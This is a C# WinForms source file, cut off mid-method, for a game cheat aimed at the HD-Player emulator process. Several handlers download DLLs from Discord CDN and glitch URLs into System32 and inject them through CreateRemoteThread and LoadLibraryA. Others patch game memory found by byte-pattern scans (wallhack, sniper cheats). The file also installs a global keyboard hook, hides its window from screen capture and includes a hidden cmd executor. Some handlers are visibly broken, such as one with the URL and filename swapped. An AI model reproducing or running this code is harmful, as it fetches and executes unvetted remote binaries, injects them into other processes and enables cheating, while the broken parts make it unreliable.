using System.Diagnostics;
using Guna.UI2.WinForms;
using Beyondmem;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static KeyAuth.api;
using System.IO;
using DiscordRPC;
using System.Web.UI.WebControls;
using static System.Windows.Forms.AxHost;
using System.Security.Cryptography;
using System.Threading;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.Net.NetworkInformation;
using Falcon_X_Cheat;
using DiscordMessenger;
using System.Diagnostics.Eventing.Reader;
using System.Reflection.Emit;
using Gma.System.MouseKeyHook;
using FalconMemx64;
using System.Reflection;
using FINDEXBRUTAL;
using KeyAuth;
using Microsoft.Graph.Models;
using DiagProcess = System.Diagnostics.Process;
using WinFormsApp = System.Windows.Forms.Application;
using Process = System.Diagnostics.Process;
using System.Collections.Concurrent;
using Form2 = System.Windows.Forms.Application;
using System.Runtime.InteropServices.ComTypes;
using Microsoft.Graph.Models.TermStore;





namespace Cheat
{
    public partial class Form2 : Form
    {
        // Import necessary functions from user32.dll
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        // Delegate for handling keyboard events
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static IntPtr hookID = IntPtr.Zero;
        private static LowLevelKeyboardProc hookCallback;
        
        private IKeyboardMouseEvents _globalHook;
        private Falcon_Memory MemLib;
        public Form2()
        {
            InitializeComponent();
            RegisterGlobalHotkeys();
            hookCallback = new LowLevelKeyboardProc(HookCallback);
            hookID = SetHook(hookCallback);
            System.Windows.Forms.Application.ApplicationExit += Application_ApplicationExit;
        }
        private bool isWallHackEnabled = false;
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

       

        private void ToggleWallHack()
        {
            if (storedAddresses.Count == 0)
            {
                MessageBox.Show("Please scan first!");
                return;
            }

            string enableBytes = "00 00 C3 40 00 00 00 00 00 00 00 00 00 00 80 BF 00 00 00 00 00 00 80 BF 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 BF 00 00 80 7F 00 00 80 7F 00 00 80 7F 00 00 80 FF";
            string disableBytes = "00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 BF 00 00 00 00 00 00 80 BF 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 80 BF 00 00 80 7F 00 00 80 7F 00 00 80 7F 00 00 80 FF";

            string replaceBytes = isWallHackEnabled ? disableBytes : enableBytes;

            foreach (var address in storedAddresses)
            {
                MemLib.WriteMemory(address.ToString("X"), "bytes", replaceBytes);
            }

            isWallHackEnabled = !isWallHackEnabled;
            start.Text = isWallHackEnabled ? "Enabled Camera Hack" : "Disabled Camera Hack";
            Console.Beep(400, 200);
        }


        private List<long> storedAddresses = new List<long>();


       

        public static Memory Memlib = new Memory();
        private void Form2_Load(object sender, EventArgs e)
        {
            this.KeyPreview = true;
            //USERNAME
            USERNAME.Text = "Username : " + Form1.KeyAuthApp.user_data.username;
            //EXPIRY DATE
            EXPIRYDATE.Text = "Expiry Date : " + UnixTimeToDateTime(long.Parse(Form1.KeyAuthApp.user_data.subscriptions[0].expiry));
            Discordrpc.rpctimestamp = Timestamps.Now;
            Discordrpc.InitializeRPC();
        }
        public string PID;

      

        private void EXITBTN_Click(object sender, EventArgs e)
        {

            System.Windows.Forms.Application.Exit();


        }
        private void RegisterGlobalHotkeys()
        {
            _globalHook = Hook.GlobalEvents();
            _globalHook.KeyDown += GlobalHook_KeyDown;
        }
        private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
        {
            // Check for specific key combinations
            if (e.KeyCode == Keys.F4)
            {
                Invoke((Action)(() => guna2GradientButton1.PerformClick()));
            }
            else if (e.KeyCode == Keys.F3)
            {
                Invoke((Action)(() => guna2Button26.PerformClick()));
            }
            else if (e.KeyCode == Keys.F2)
            {
                Invoke((Action)(() => guna2Button27.PerformClick()));
            }
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Unregister the global hook
            if (_globalHook != null)
            {
                _globalHook.Dispose();
                _globalHook = null;
            }
            base.OnFormClosing(e);
        }
        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
        public DateTime UnixTimeToDateTime(long unixtime)
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            try
            {
                dtDateTime = dtDateTime.AddSeconds(unixtime).ToLocalTime();
            }
            catch
            {
                dtDateTime = DateTime.MaxValue;
            }
            return dtDateTime;

        }
        //===============================================
        public string expirydaysleft()
        {
            System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Local);
            dtDateTime = dtDateTime.AddSeconds(long.Parse(Form1.KeyAuthApp.user_data.subscriptions[0].expiry)).ToLocalTime();
            TimeSpan difference = dtDateTime - DateTime.Now;
            return Convert.ToString(difference.Days + " Days " + difference.Hours + " Hours Left ");
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {




        }


        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {

        }




        private void timer1_Tick_3(object sender, EventArgs e)
        {


        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        private readonly bool k;
        private WebClient webclient = new WebClient();
        private void guna2ToggleSwitch3_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\3D_1.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://cdn.discordapp.com/attachments/1225003093033226270/1233129277646438554/3D_1.dll?ex=66353322&is=6633e1a2&hm=237238f1246a0544c54056fc2062752389d5e729499f424986293f748dff7195&";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "3D_1.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
            start.ForeColor = Color.Green;
            start.Text = "Applied Chams";
        }

        private void guna2ToggleSwitch2_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2Separator3_Click(object sender, EventArgs e)
        {

        }

        private async void guna2ToggleSwitch8_CheckedChanged(object sender, EventArgs e)
        {
            string search = "A0 E1 00 10 A0 E3 6A 14 01 EB 00 00 00 EA 00 60 A0 E3";
            string replace = "A0 E1 00 10 A0 E3 6A 14 01 EB 00 00 00 EA 00 60 A0 E2";
            MemLib = new Falcon_Memory();
            MemLib.OpenProcess("HD-Player");


            IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

            if (wl.Any())
            {
                foreach (var address in wl)
                {
                    MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                }

            }
            start.Text = "Applied Delay Fix";
            Console.Beep(400, 200);
        }

        private void guna2ToggleSwitch10_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\ChamsRed.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://cdn.discordapp.com/attachments/1216047471956856923/1216052757975400528/ChamsRed.dll?ex=6623e662&is=66117162&hm=489f2482dd91f136fce4dea15685a4f35e446699a31763b5a2eefd370c4b3a07&";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "ChamsRed.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
            start.ForeColor = Color.Green;
            start.Text = "Applied Chams";
        }

        private void guna2ToggleSwitch9_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\ChamsMenu2.0_6.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://cdn.discordapp.com/attachments/1225003093033226270/1233403693106200677/ChamsMenu2.0_6.dll?ex=66343873&is=6632e6f3&hm=0313588f8af5d5e4788ab1e9f8a27ebf80d99c9835ae71cfbff4179ca52935a0&";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "ChamsMenu2.0_6.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
            start.ForeColor = Color.Green;
            start.Text = "Applied Chams";
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }
        public void Alert(string msg, FXMSG.enmType type)
        {
            FXMSG frm = new FXMSG();
            frm.showAlert(msg, type);
        }
        private async void guna2ToggleSwitch7_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch7.Checked)
            {

                string search = "81 95 E3 3F 00 00 00 00 81 95 E3 3F 00 00 80 3F 00 00 80 3F 0A D7 A3 3D 00 00 00 00 00 00 5C 43 00 00 90 42 00 00 B4 42 96 00 00 00 00 00 00 00 00 00 00 3F 00 00 80 3E 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 3D 0A 57 3F 9A 99 99 3F 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 80 3F 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 3F";
                string replace = "81 95 E3 3F 00 00 00 00 81 95 E3 3F 00 00 80 3F 00 00 80 3F 0A D7 A3 3D 00 00 00 00 00 00 5C 43 00 00 90 42 00 00 B4 42 96 00 00 00 00 00 00 00 00 00 00 1C 00 00 80 1F 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 3D 0A 57 3F 9A 99 99 3F 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 80 3F 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 3F";

                if (System.Diagnostics.Process.GetProcessesByName("HD-Player").Length == 0)
                {

                    return;  // Exit if no emulator is found
                }
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");
                // Append failure message with a timestamp


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }



                }

                start.Text = "Applied Sniper Switch";
                Console.Beep(400, 200);
            }
            else
            {

                string search = "81 95 E3 3F 00 00 00 00 81 95 E3 3F 00 00 80 3F 00 00 80 3F 0A D7 A3 3D 00 00 00 00 00 00 5C 43 00 00 90 42 00 00 B4 42 96 00 00 00 00 00 00 00 00 00 00 1C 00 00 80 1F 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 3D 0A 57 3F 9A 99 99 3F 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 80 3F 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 3F";
                string replace = "81 95 E3 3F 00 00 00 00 81 95 E3 3F 00 00 80 3F 00 00 80 3F 0A D7 A3 3D 00 00 00 00 00 00 5C 43 00 00 90 42 00 00 B4 42 96 00 00 00 00 00 00 00 00 00 00 3F 00 00 80 3E 00 00 00 00 04 00 00 00 00 00 80 3F 00 00 20 41 00 00 34 42 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 80 3F 3D 0A 57 3F 9A 99 99 3F 00 00 80 3F 00 00 00 00 00 00 80 3F 00 00 80 3F 00 00 80 3F 00 00 00 00 00 00 00 00 00 00 00 3F";

                if (System.Diagnostics.Process.GetProcessesByName("HD-Player").Length == 0)
                {

                    return;  // Exit if no emulator is found
                }
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");
                // Append failure message with a timestamp


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }



                }
                else
                {
                    // Append failure message with a timestamp


                }
                start.Text = "Disabled Sniper Switch";
                Console.Beep(400, 200);
            }

        }

        public static bool Streaming;
        [DllImport("user32.dll")]
        public static extern uint SetWindowDisplayAffinity(IntPtr hwnd, uint dwAffinity);

        private void STRMODE_CheckedChanged(object sender, EventArgs e)
        {
            if (STRMODE.Checked)
            {
                base.ShowInTaskbar = false;
                Form2.Streaming = true;
                Form2.SetWindowDisplayAffinity(base.Handle, 17U);
            }
            else
            {
                base.ShowInTaskbar = true;
                Form2.Streaming = false;
                Form2.SetWindowDisplayAffinity(base.Handle, 0U);
            }
        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick_2(object sender, EventArgs e)
        {

        }
        private void guna2Button4_Click(object sender, EventArgs e)
        {

        }

        private async void guna2ToggleSwitch4_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch4.Checked)
            {

                string search = "08 00 00 00 00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 06 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 41 00 00 48 42 00 00 00 3F 33 33 13 40 00 00 B0 3F 00 00 80 3F 01 00 00";
                string replace = "08 00 00 00 00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 07 00 00 00 00 00 FF FF 00 00 00 00 00 00 F0 41 00 00 48 42 00 00 00 3F 33 33 13 40 00 00 B0 3F 00 00 80 3F 01 00 00";
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }



                }
                start.Text = "Applied Sniper Scope";
                Console.Beep(400, 200);
            }
            else
            {

                string search = "08 00 00 00 00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 07 00 00 00 00 00 FF FF 00 00 00 00 00 00 F0 41 00 00 48 42 00 00 00 3F 33 33 13 40 00 00 B0 3F 00 00 80 3F 01 00 00";
                string replace = "08 00 00 00 00 00 60 40 CD CC 8C 3F 8F C2 F5 3C CD CC CC 3D 06 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 41 00 00 48 42 00 00 00 3F 33 33 13 40 00 00 B0 3F 00 00 80 3F 01 00 00";
                MemLib = new Falcon_Memory();
                MemLib.OpenProcess("HD-Player");


                IEnumerable<long> wl = await MemLib.AoBScan(search, writable: true);

                if (wl.Any())
                {
                    foreach (var address in wl)
                    {
                        MemLib.WriteMemory(address.ToString("X"), "bytes", replace);
                    }

                }
                start.Text = "Disabled Sniper Scope";
                Console.Beep(400, 200);
            }


        }

        private void guna2ToggleSwitch5_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {


        }




        private void pictureBox3_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://discord.gg/kDbJkasJNb");
        }
        public void ExecuteCommand(string command)
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe")
            {
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (System.Diagnostics.Process process = new System.Diagnostics.Process { StartInfo = psi })
            {
                process.Start();

                // Write the command to the command prompt
                process.StandardInput.WriteLine(command);
                process.StandardInput.Flush();
                process.StandardInput.Close();

                // Wait for the command to finish
                process.WaitForExit();
            }
        }

        private void guna2ToggleSwitch6_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch5_CheckedChanged(object sender, EventArgs e, bool k)
        {


        }

        private void guna2ToggleSwitch6_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch6_CheckedChanged_2(object sender, EventArgs e)
        {


        }

        private void guna2ToggleSwitch6_CheckedChanged_3(object sender, EventArgs e)
        {

        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2VSeparator1_Click(object sender, EventArgs e)
        {

        }

        private void guna2VSeparator1_Click_1(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }



        private  void guna2ToggleSwitch10_CheckedChanged_1(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch10_CheckedChanged_2(object sender, EventArgs e)
        {

        }

        private void guna2Separator1_Click(object sender, EventArgs e)
        {

        }

        private void guna2Separator3_Click_1(object sender, EventArgs e)
        {

        }

        private void label14_Click(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch2_CheckedChanged_1(object sender, EventArgs e)
        {


        }




        private void guna2ToggleSwitch10_CheckedChanged_3(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch11_CheckedChanged(object sender, EventArgs e)
        {
            string fileName = "https://cdn.discordapp.com/attachments/1225003093033226270/1235722160568401960/3D_1.dll?ex=66356771&is=663415f1&hm=ad0700598ad336fc4abcb913459ddd081ac0d2c1f77e574c5997d943fdcb0f8e&";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "3D.dll";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "3D.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2ToggleSwitch11_CheckedChanged_1(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\3D.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://cdn.discordapp.com/attachments/1225003093033226270/1235722160568401960/3D_1.dll?ex=66356771&is=663415f1&hm=ad0700598ad336fc4abcb913459ddd081ac0d2c1f77e574c5997d943fdcb0f8e&";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "3D.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }

        private void guna2ToggleSwitch11_CheckedChanged_2(object sender, EventArgs e)
        {
            string fileName = "C:\\Windows\\System32\\3D.dll";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string adress = "https://cdn.discordapp.com/attachments/1218341762582712390/1231808304724967524/3D.dll?ex=66384de1&is=6625d8e1&hm=aec2f101225b1184a8119f93ba94b35c46b1ad594d227edb1a63e1ccf88178d2&";
            bool flag = File.Exists(fileName);
            if (flag)
            {
                File.Delete(fileName);
            }
            this.webclient.DownloadFile(adress, fileName);
            System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player")[0];
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            string dllName = "3D.dll";
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttribute, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void ExtractEmbeddedResource(string resourceName, string outputPath)
        {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();

            // Get the embedded resource stream
            using (Stream resourceStream = executingAssembly.GetManifestResourceStream(resourceName))
            {
                if (resourceStream == null)
                {
                    throw new ArgumentException($"Resource '{resourceName}' not found.");
                }

                // Read the embedded resource and save it to the specified path
                using (FileStream fileStream = new FileStream(outputPath, FileMode.Create))
                {
                    byte[] buffer = new byte[resourceStream.Length];
                    resourceStream.Read(buffer, 0, buffer.Length);
                    fileStream.Write(buffer, 0, buffer.Length);
                }
            }
        }
        private void guna2ToggleSwitch3_CheckedChanged_1(object sender, EventArgs e)
        {
            try
            {
                if (System.Diagnostics.Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    //Type Here Emulator Not Found
                    start.Text = "Emulator Not Found";
                    Console.Beep(240, 300);
                }
                else
                {
                    string dllName = "FINDEX_CHEATS.dll";
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                    string adress = "https://cdn.glitch.global/0f1fdd56-24e4-4d20-8ac6-3930cf47f881/FINDEX_CHEATS.dll?v=1730754960693";
                    string fileName = $"C:\\Windows\\System32\\{dllName}";
                    bool flag = File.Exists(fileName);

                    if (flag)
                    {
                        File.Delete(fileName);
                    }
                    this.webclient.DownloadFile(adress, fileName);
                    System.Diagnostics.Process targetProcess = System.Diagnostics.Process.GetProcessesByName("HD-Player").FirstOrDefault();
                    if (targetProcess != null)
                    {
                        start.Text = "Chams Injected";
                    }
                    IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
                    IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                    UIntPtr bytesWritten;
                    WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
                }
            }
            catch
            {
                Console.Beep(240, 300);
                start.Text = "Chams Already Injected";
            }
        }

        private  void guna2ToggleSwitch9_CheckedChanged_1(object sender, EventArgs e)

        {

        }

        private void guna2Separator3_Click_2(object sender, EventArgs e)
        {

        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void guna2GradientButton3_Click(object sender, EventArgs e)

        {
        }

        private void guna2GradientButton6_Click(object sender, EventArgs e)
        {

        }

        private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
        {
            if (guna2ToggleSwitch8.Checked)

            {
